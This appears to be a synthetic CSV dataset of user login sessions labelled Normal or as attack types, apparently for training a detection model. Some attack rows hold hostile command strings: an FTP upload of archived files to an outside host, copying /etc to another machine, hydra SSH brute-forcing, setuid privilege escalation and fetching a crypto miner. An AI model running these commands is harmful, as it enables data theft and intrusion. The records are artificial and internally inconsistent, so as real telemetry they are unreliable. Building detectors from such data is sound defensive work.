timestamp,entity_id,entity_type,login_hour,day_of_week,session_duration,command_length,unique_resources,failed_login_count,is_known_device,is_known_location,auth_method,source_ip,geo_location,device_fingerprint,resource_accessed,command_sequence,login_success,label
2024-12-28 14:03:52,user_0132,contractor,12,3,394,43,4,1,1,1,password,172.25.34.104,"London, UK",5eaedc287511e583bcc69871f0a4ab70,email_server,ls -la; cat report.txt; logout,1,Normal
2024-12-28 09:10:29,user_0105,employee,8,0,2781,192,1,0,1,1,password,172.17.142.77,"Tokyo, JP",6df4d1c3d90b37180b2cc8cf1417d236,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-04-06 08:07:18,user_0057,contractor,12,2,1763,138,4,1,1,1,password,192.168.95.13,"Tokyo, JP",3bcded53fa6b9c49f119ffb03bc3270a,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-02-13 00:00:08,user_0036,contractor,13,4,3106,111,4,1,1,1,mfa,192.168.65.160,"Tokyo, JP",1f63028fec1f189dcd760aedafefaac7,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-06-23 03:48:14,user_0090,employee,18,0,3389,27,2,0,1,1,password,10.168.213.101,"Singapore, SG",fd70c65cf814f9714b38690fefe856fd,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-04-02 16:55:30,user_0009,contractor,13,0,1455,172,2,0,1,1,mfa,172.27.175.115,"Tokyo, JP",5f7d30abf4018c5aa43aef87203d0a29,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-06-29 14:21:15,user_0123,employee,12,4,2527,124,3,0,1,1,password,192.168.92.6,"New York, US",8569f336f02a656be8eca5fda2bbaa88,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-04-15 10:54:33,user_0050,contractor,13,3,2398,25,3,1,1,1,mfa,192.168.126.180,"London, UK",b9c56f4342349d2b51ce47bcbaf4b6ef,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-06-01 20:34:16,user_0064,contractor,16,3,3244,48,2,1,1,1,sso,192.168.196.67,"Berlin, DE",36d5cf68ebaf294732238c9d79b8002d,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-03-09 19:31:48,user_0091,vendor,14,3,164498,384,11,3,0,0,vpn,131.53.190.71,"Beijing, CN",bf41623d460fd6134c8b44eda8f81d5e,admin_console,ssh admin@192.168.1.50; sudo su; scp -r /etc root@10.0.0.2:/tmp,1,Session Hijacking
2024-11-22 01:17:26,user_0184,contractor,14,2,1003,136,2,1,1,1,mfa,172.31.110.202,"London, UK",f41e9027bc8165afed6fc52e3736e691,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-02-16 12:54:31,user_0129,employee,8,4,628,67,1,0,1,1,sso,172.19.74.33,"London, UK",b2268e663b47f98924aa5a513e5d1b67,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-04-11 15:19:46,user_0109,employee,13,2,3572,123,4,0,1,1,sso,10.82.250.34,"London, UK",c325364834c7960e7fb3bed0c45a8ebe,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-03-20 09:56:57,user_0163,employee,2,4,1239,174,7,0,1,0,mfa,10.81.159.125,"Sao Paulo, BR",1887986071c155c3912509af1bc1321f,financial_db,ls -la; cat report.txt; logout,1,Off-Hours Access
2025-02-21 12:03:21,user_0194,employee,11,4,3525,40,5,1,1,1,sso,172.22.193.117,"Berlin, DE",6431516bdc4f4141471f6d4698b6267c,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-02-18 10:59:06,user_0199,contractor,14,2,546,86,3,0,1,1,mfa,172.24.127.55,"New York, US",7b0ba1639bcaa0fd643c731380c9fb88,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-02-07 14:24:50,user_0175,employee,9,3,366,51,2,1,1,1,mfa,10.231.88.79,"New York, US",53ab5e0eb06edffe199112ed6947ce8d,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-03-28 17:18:25,user_0125,contractor,15,0,559,86,3,0,1,1,sso,172.17.52.181,"Singapore, SG",5e8a485aeb48e8371d7da6e56d741e03,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-02-17 14:23:52,user_0080,vendor,2,4,848,1244,12,0,1,1,certificate,172.30.254.78,"Sao Paulo, BR",442ec09dd7e6fca4a0d4756f8d1e3efe,erp_system,sudo bash; chmod 4755 /usr/bin/find; visudo,1,Privilege Escalation
2024-05-20 18:25:59,user_0129,contractor,12,4,1889,157,1,1,1,1,sso,192.168.28.196,"New York, US",ea1c1b83b7633a8bdf4db994ddf3e758,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-12-04 09:35:56,user_0063,contractor,16,0,1921,99,3,0,1,1,mfa,192.168.16.20,"London, UK",45d7686327a68f01a4f703169ebc2ad8,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-08-31 20:34:57,user_0199,employee,14,3,2070,59,4,1,1,1,password,10.29.35.89,"Berlin, DE",a43396b363b6f598c855a9bb9dedf422,email_server,ls -la; cat report.txt; logout,1,Normal
2024-02-29 10:44:13,user_0011,contractor,13,0,901,175,1,1,1,1,sso,172.19.212.96,"New York, US",02fbe0cc591b73d882af09d191fa98b7,email_server,ls -la; cat report.txt; logout,1,Normal
2025-06-02 16:26:07,user_0016,employee,15,2,954,123,5,1,1,1,sso,192.168.89.22,"New York, US",9df3a87d2d2616ca07a85ae7b1e6ac4c,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-01-12 10:09:36,user_0108,contractor,14,1,1968,66,2,1,1,1,sso,172.29.141.116,"Singapore, SG",33668b2bb1d153d5bfebe13710fb2c2b,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-04-13 20:03:28,user_0115,contractor,8,1,2638,64,4,0,1,1,password,192.168.104.251,"New York, US",f8136aeffb6fd5923ef1ec8b299ebc38,email_server,ls -la; cat report.txt; logout,1,Normal
2025-05-10 03:44:46,user_0065,vendor,3,4,595,1481,3,8,1,1,certificate,172.27.31.139,"Mumbai, IN",fda880be6a7fca30242a451e29db1463,source_code_repo,sudo bash; chmod 4755 /usr/bin/find; visudo,1,Privilege Escalation
2025-02-12 08:25:08,user_0014,contractor,15,4,433,148,3,1,1,1,sso,10.134.192.184,"London, UK",8f52f8d47d1550d302a3ea8c645cb9f3,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-02-19 18:03:19,user_0038,contractor,17,3,2908,165,2,0,1,1,mfa,192.168.73.114,"Singapore, SG",ce707ab03d6c4da721df5c3694596a9b,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-03-27 04:01:33,user_0154,employee,9,3,740,63,3,0,1,1,password,172.21.205.122,"Tokyo, JP",9c0b262e898e6eead70d9a5ecc1c26bc,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-04-29 14:13:47,user_0166,contractor,12,4,3189,89,4,1,1,1,mfa,172.21.201.153,"London, UK",c56c3ae5b3dd421466607e588e4bb961,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-11-02 22:00:05,user_0172,contractor,17,1,2420,23,1,0,1,1,sso,192.168.176.5,"Berlin, DE",2bba734257df143f3d2209446f2c071f,email_server,ls -la; cat report.txt; logout,1,Normal
2024-09-27 03:02:33,user_0151,contractor,13,3,3190,58,5,1,1,1,password,192.168.87.247,"Berlin, DE",211d375921134ea57f9256557156cd4b,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-02-21 21:55:48,user_0191,admin,10,2,1855,401,5,0,0,0,oauth,36.197.90.101,"Dubai, AE",249fbecf4d66a05e3173d5385a07d0a0,erp_system,ls -la; cat report.txt; logout,1,Impossible Travel
2025-01-06 09:13:17,user_0187,employee,15,0,1149,162,3,0,1,1,password,172.21.165.185,"Tokyo, JP",e407d326f244c78d540abe2b990a779e,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-02-14 01:47:05,user_0004,employee,16,3,2585,162,5,0,1,1,mfa,10.75.122.140,"Singapore, SG",cf751599b1baf0e1494ef505dc25c221,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-04-21 01:36:40,user_0029,employee,14,1,3374,134,4,1,1,1,password,10.144.127.209,"Singapore, SG",05cb9757ff9f124ea527b693a3a77c4d,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-02-22 19:38:10,user_0116,employee,8,2,2374,180,2,1,1,1,sso,10.25.150.216,"London, UK",224021615593ae75faf5ee4508989561,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-12-05 01:51:39,user_0053,employee,11,1,3104,162,3,0,1,1,mfa,192.168.152.82,"London, UK",e7eeed15ddddbc082132d7ff7be4bce3,email_server,ls -la; cat report.txt; logout,1,Normal
2024-03-11 23:50:54,user_0128,contractor,18,0,544,111,2,0,1,1,password,192.168.80.179,"Tokyo, JP",55f6dcf0a107ae3bfc08c2e061281836,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-09-24 06:52:19,user_0040,employee,18,1,513,193,3,1,1,1,sso,172.26.108.145,"New York, US",0f85a2309701fae69a7b334242df1e7e,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-02-07 14:25:40,user_0060,contractor,14,4,1704,187,3,1,1,1,sso,10.232.194.221,"Singapore, SG",73c851dc958bf00acdc36e79437696f0,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-03-03 10:55:19,user_0193,employee,11,2,1567,124,5,1,1,1,sso,192.168.197.42,"New York, US",a31dbb9c317223da9663f2358f07b378,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-09-20 01:56:48,user_0168,employee,16,4,2030,25,1,1,1,1,mfa,10.205.167.135,"Berlin, DE",be2b317855e4ddf5001dbdef77ed1c83,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-03-02 07:57:37,user_0095,employee,8,4,1771,48,3,0,1,1,password,192.168.98.45,"Tokyo, JP",f66400186b2759db6925215e56c53628,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-03-15 16:57:11,user_0107,contractor,11,4,641,45,4,0,1,1,sso,192.168.28.60,"Tokyo, JP",5c7712aa1f2c4313fce59acbfb4aa7b0,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-09-20 06:44:59,user_0003,contractor,15,4,1582,27,1,0,1,1,mfa,172.26.87.196,"London, UK",0785b7e3ee0b71d013ec183a8006e735,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-01-11 06:11:02,user_0009,employee,12,3,778,81,1,1,1,1,sso,192.168.247.75,"New York, US",1228bae27279c35228d0b34f4ea9db14,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-11-07 01:03:14,user_0027,employee,12,4,2980,171,1,0,1,1,password,172.17.232.128,"Berlin, DE",335ea09498fb96649b498d1e10cd56b7,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-01-13 15:58:20,user_0113,contractor,16,0,3029,160,5,0,1,1,password,172.17.160.234,"Tokyo, JP",404aeafba730f3dc1c9f726e721a0122,email_server,ls -la; cat report.txt; logout,1,Normal
2025-04-29 08:40:25,user_0077,contractor,8,1,1189,106,5,0,1,1,sso,10.60.157.134,"Tokyo, JP",29b7c91036a560224de7fbe41a5d48d2,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-10-15 12:39:12,user_0031,contractor,13,2,1504,144,1,0,1,1,password,172.24.31.221,"Singapore, SG",618825e88b84ccb11f6bf7bd253ea99e,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-02-27 10:48:36,user_0097,contractor,17,3,2684,122,5,1,1,1,sso,192.168.61.105,"New York, US",085a98b08d5b34c7ab66c0dcc30eaa5c,email_server,ls -la; cat report.txt; logout,1,Normal
2025-04-14 04:00:38,user_0049,employee,16,2,334,96,3,1,1,1,mfa,192.168.17.164,"Tokyo, JP",a0afec107be3b7bbde964a457d86e668,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-12-23 12:40:38,user_0163,employee,21,2,3777,1959,19,6,1,1,sso,10.8.88.3,"Cape Town, ZA",d6fe14e8004eaebfd9003d4c84278716,financial_db,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Insider Threat
2024-08-08 23:43:25,user_0178,contractor,18,1,2025,32,1,1,1,1,mfa,192.168.90.155,"Singapore, SG",253a44f99fbf84e9e9e692b8abd24de7,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-08-18 05:01:55,user_0098,employee,16,1,2581,114,5,0,1,1,mfa,172.30.122.207,"New York, US",97d909329f5d4db5b6d2724858fd31d0,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-04-21 22:58:07,user_0118,contractor,11,1,1219,34,2,0,1,1,sso,172.21.62.73,"London, UK",015d3bd1d0869c72d90abf6518062d2c,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-08-29 13:06:42,user_0002,employee,18,4,656,105,4,0,1,1,password,192.168.203.204,"Singapore, SG",5c59495e850531a9e95341f1275654a2,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-02-12 08:39:44,user_0190,employee,17,1,1478,23,3,0,1,1,mfa,10.182.20.87,"Tokyo, JP",b15b1c6e58aa89f53330b507407dc391,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-04-05 11:43:26,user_0196,employee,0,0,9,32,0,24,0,0,password,93.49.27.159,"Beijing, CN",2a35ddd960a78f2d8197935c566be1ef,admin_console,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target,0,Credential Abuse
2024-07-19 02:31:28,user_0126,employee,10,2,1223,38,2,1,1,1,sso,192.168.196.47,"Singapore, SG",ad7cd470ad7781e4a1ed00ffffc068bd,email_server,ls -la; cat report.txt; logout,1,Normal
2024-03-20 13:10:50,user_0109,employee,12,0,2142,87,3,0,1,1,mfa,172.20.254.187,"New York, US",f5fee2f9982343763b230329dce2fbd8,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-06-03 19:50:00,user_0103,employee,10,1,2255,102,2,0,1,1,mfa,192.168.90.43,"Tokyo, JP",d8ad694345602ebad11ee8e3efbb6f5f,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-12-24 01:23:34,user_0019,contractor,13,4,1587,50,4,1,1,1,mfa,192.168.244.123,"Berlin, DE",7e875895f046696f1492f3667f1a5f79,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-09-08 08:28:48,user_0114,contractor,17,4,2849,37,2,0,1,1,password,10.166.56.89,"New York, US",ab36d1d8f875f1cb7e824a5e42b7a348,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-03-22 22:55:36,user_0192,contractor,18,3,3177,190,4,0,1,1,password,172.20.43.210,"London, UK",c4436d96bc7774773eed62ccc69d7a5f,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-09-19 01:22:26,user_0164,contractor,18,4,2641,123,1,0,1,1,password,172.29.199.106,"Berlin, DE",1f8b53ba222f62bed8271585d7bb469b,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-10-12 18:31:43,user_0023,employee,17,0,357,154,4,1,1,1,sso,172.27.194.28,"Tokyo, JP",85e0ed0fe112d52556df3ad1c9777c5a,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-01-31 20:16:55,user_0061,contractor,18,0,1862,119,4,1,1,1,sso,10.252.184.227,"New York, US",ce61088289341c747bdc06844cec7f91,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-02-27 12:44:39,user_0061,contractor,4,5,408,79,0,0,1,0,mfa,192.168.208.242,"Amsterdam, NL",55a8fec8b7a17958eceacb52d7174cbb,vpn_gateway,ls -la; cat report.txt; logout,1,Off-Hours Access
2024-07-10 05:54:50,user_0087,contractor,10,1,2310,68,4,0,1,1,mfa,172.26.93.232,"New York, US",43221338adeba540ebca6608890ed3d4,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-06-03 05:20:50,user_0001,employee,15,3,1047,20,3,1,1,1,mfa,10.117.0.181,"Singapore, SG",faaea163349ce0a27eceded898982d07,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-08-05 08:52:01,user_0071,contractor,10,0,2815,178,5,0,1,1,sso,192.168.194.111,"Berlin, DE",1a62c08eef15cf74bb4a9f6589d88c61,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-03-22 06:50:57,user_0029,employee,18,1,3237,48,1,1,1,1,password,10.3.209.29,"Berlin, DE",79397c25742f9b4e1d7039ad4017455b,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-11 01:44:36,user_0170,employee,12,4,2560,34,2,1,1,1,password,10.138.137.79,"New York, US",a33debd6c9d7f5d7716db9fbc215925d,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-04-03 15:56:38,user_0104,contractor,16,1,2078,189,3,0,1,1,sso,172.21.254.60,"Tokyo, JP",4384e6a20483aff658440994e55eb56e,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-02-21 00:39:10,user_0180,employee,9,1,2993,190,3,0,1,1,sso,192.168.45.224,"Singapore, SG",95e47996a0a95bd378080cf52f71c7d3,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-03-05 22:44:50,user_0099,contractor,16,4,3480,197,2,0,1,1,password,10.233.14.84,"Berlin, DE",44df42735981343cef08923fa5787f93,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-02-10 00:43:46,user_0135,employee,13,2,1458,119,4,1,1,1,sso,10.136.229.192,"Singapore, SG",b75ee72789a1067cc959e4c992f5d28f,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-01-28 00:25:29,user_0114,employee,15,4,931,68,3,1,1,1,sso,192.168.32.127,"Singapore, SG",7425c63015a39f17c008b3501d2c2f91,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-03-17 12:54:34,user_0150,employee,17,3,360,37,3,0,1,1,mfa,172.28.118.71,"London, UK",84b6aa258140090c18801645327517ce,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-03-29 20:12:42,user_0068,contractor,18,3,2102,196,4,1,1,1,password,10.201.164.203,"London, UK",1e45fc0192c49b0acbbc113ba9941066,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-06-06 19:52:32,user_0131,employee,16,2,1900,170,1,1,1,1,sso,192.168.80.20,"Tokyo, JP",3f3602bb74b2dc8d16df466723108680,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-03-31 07:23:53,user_0124,contractor,9,3,2895,76,2,1,1,1,mfa,172.19.145.148,"Berlin, DE",fa2a6bc21bafaa81e80de0f456e90067,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-04-04 14:44:10,user_0179,contractor,16,0,2778,53,4,0,1,1,mfa,10.10.201.81,"Berlin, DE",a271274866296c1dae7a4f6e43141095,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-11-12 01:37:50,user_0089,employee,11,0,2601,143,4,0,1,1,sso,172.25.66.133,"London, UK",64810e5eab48b5ce90af287efaf3c92d,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-08-09 08:33:00,user_0095,employee,15,4,3181,97,5,0,1,1,sso,10.136.232.237,"Singapore, SG",9d92549789f616e2a132c87612988f94,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-09-11 03:54:57,user_0165,contractor,12,1,3340,190,2,1,1,1,password,172.17.242.116,"Berlin, DE",55df2a8761929ea5f64578624852920e,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-04-26 15:34:38,user_0045,admin,14,4,165444,342,14,7,0,0,vpn,182.222.126.46,"Toronto, CA",220bfcc2972476e0fb6347befb4e3489,secrets_vault,ssh admin@192.168.1.50; sudo su; scp -r /etc root@10.0.0.2:/tmp,1,Session Hijacking
2025-03-31 19:14:20,user_0103,contractor,18,2,1116,112,2,1,1,1,mfa,10.90.146.193,"Singapore, SG",3bf0acf14d643e48d5171a8c38ec3b98,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-05-12 12:48:52,user_0077,contractor,9,2,2008,65,4,0,1,1,password,10.32.209.207,"New York, US",478b0498f551a52bebacfabdf1e3c960,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-10-03 08:30:21,user_0088,employee,14,4,2553,66,4,0,1,1,mfa,172.17.169.45,"Tokyo, JP",a3d2150298aa7009cdcc6f1db7bea5a1,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-08-14 09:13:44,user_0031,employee,11,4,3535,182,3,0,1,1,sso,192.168.241.14,"Tokyo, JP",ba5b2258df84be57eedb6e11eecb738a,email_server,ls -la; cat report.txt; logout,1,Normal
2024-12-18 04:47:31,user_0110,contractor,10,2,2631,20,4,0,1,1,password,172.28.171.50,"New York, US",5e01eb553b0e03dd2b530c6182fdcf48,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-11-07 07:07:23,user_0185,employee,14,2,2239,101,2,1,1,1,mfa,192.168.154.147,"Tokyo, JP",d871837e0a77135f81077553b8b58b80,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-06-10 05:18:48,user_0152,service_account,4,3,61190,550,6,0,1,0,password,208.52.87.59,"Sydney, AU",aa752ae6ba4b778793e4aa7e49df8ad2,customer_data,wget miner.exe; chmod +x miner.exe; ./miner.exe --pool pool.minexmr.com,1,Cryptomining
2025-05-23 19:41:15,user_0020,contractor,15,1,1060,50,1,1,1,1,mfa,172.26.41.237,"Berlin, DE",d13ed8c9221b1597859e0dd175231a83,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-10-19 19:28:35,user_0111,employee,13,2,2853,151,1,1,1,1,password,172.22.62.98,"London, UK",4fd028d914a9b8a44010e16ec3cd995e,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-21 17:58:36,user_0044,contractor,14,3,420,117,4,0,1,1,mfa,10.50.118.213,"London, UK",26bd5e8d0e71f619495a3a9ff12afcc8,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-08-12 10:53:21,user_0063,contractor,16,2,1144,122,5,0,1,1,mfa,10.8.196.244,"Berlin, DE",353ab67788b784d0e60178e306efd855,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-01-14 12:38:48,user_0102,contractor,17,1,2973,116,1,1,1,1,sso,10.69.158.133,"Tokyo, JP",59328fef17d5dd63839483f1b8b1a2ee,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-04-22 02:54:41,user_0182,contractor,8,4,1990,126,5,0,1,1,mfa,172.27.212.145,"London, UK",51f98dc81eaba4499ed8a420a4387188,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-02-05 07:28:09,user_0021,contractor,18,1,3441,166,4,0,1,1,mfa,192.168.20.21,"Singapore, SG",fbb696c5a407e6d4253849c2d7f6db8c,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-05-23 16:09:57,user_0162,employee,2,6,30,27,0,7,1,0,password,144.36.168.16,"Sao Paulo, BR",99602cd260b0cd0e656891536c36ec34,vpn_gateway,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target,0,Credential Abuse
2024-12-07 18:32:21,user_0145,contractor,15,2,2481,131,4,1,1,1,sso,172.29.170.212,"Berlin, DE",2cdbfe820c8a13ea69481c8205e32c3a,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-03-12 05:56:15,user_0132,employee,13,1,2210,51,3,1,1,1,password,192.168.130.183,"London, UK",3dbd1f1f7dba7ba45c6b7d398f5d4fd3,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-04-08 05:48:09,user_0176,contractor,13,3,2941,189,1,0,1,1,password,192.168.43.112,"London, UK",b9d9f57a8651113a32e58db75ded72a8,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-11-17 19:22:38,user_0052,contractor,12,4,2410,136,5,0,1,1,password,10.56.211.93,"Singapore, SG",a20a42f10f184eeadf78160731d6ed59,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-06-26 13:02:36,user_0013,employee,10,0,2820,198,5,0,1,1,mfa,172.25.117.152,"New York, US",494401d3cf38795f906a11c6122217de,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-08-11 22:25:30,user_0044,employee,9,2,3528,59,1,1,1,1,mfa,10.36.4.210,"Tokyo, JP",36a383bb513c228ad30be8453cb05ee0,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-01-08 21:22:52,user_0156,service_account,11,4,3348,322,2,0,0,1,oauth,216.28.184.77,"Sao Paulo, BR",2bd078f1efe72923b8309056736763d4,internal_wiki,ls -la; cat report.txt; logout,1,Impossible Travel
2024-03-06 06:23:53,user_0193,contractor,15,4,1740,78,5,0,1,1,mfa,192.168.160.49,"Singapore, SG",f048a19a2ee6d42db4b5708cacdf3c8c,email_server,ls -la; cat report.txt; logout,1,Normal
2025-03-29 14:20:32,user_0197,employee,10,0,1315,188,2,1,1,1,sso,172.24.76.93,"New York, US",bb7036c194917650e9feb2db7105cba7,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-05-10 14:43:37,user_0154,employee,9,0,2776,53,4,0,1,1,password,172.18.32.160,"London, UK",37b71cb53e52d0d10b2f531cadd4bc8b,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-03-07 13:41:43,user_0076,contractor,9,2,563,107,1,0,1,1,mfa,172.30.210.167,"Tokyo, JP",765bc559229d1926c51d76b783aef0dd,financial_db,ls -la; cat report.txt; logout,1,Normal
